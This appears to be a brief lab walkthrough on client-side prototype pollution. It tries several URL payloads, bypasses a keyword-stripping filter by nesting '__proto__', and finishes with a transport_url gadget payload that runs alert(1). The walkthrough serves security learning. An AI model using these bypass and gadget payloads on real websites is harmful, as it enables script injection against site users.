
1. Verify that DOM invader wont work;
2. Notice that if you try the common payload `/?__proto__.foo=bar`
3. Your injection will not work;

![](/static/img/Pasted_image_20231202091001.png)
4. Try alternative prototype pollution vectors. For example:

```javascript
/?__proto__[foo]=bar 
/?constructor.prototype.foo=bar
```

5.  Observe that in each instance, `Object.prototype` is not modified.
6. Verify the JavaScript function, notice the following:

![](/static/img/Pasted_image_20231202091402.png)

7. Inject the following payload and verify that now you can inject;

![](/static/img/Pasted_image_20231202091506.png)

8. Search for the `gadget` and exploit with the following payload;

`/?__pro__proto__to__[transport_url]=data:,alert(1);`


![](/static/img/Pasted_image_20231202091601.png)

![](/static/img/Pasted_image_20231202091614.png)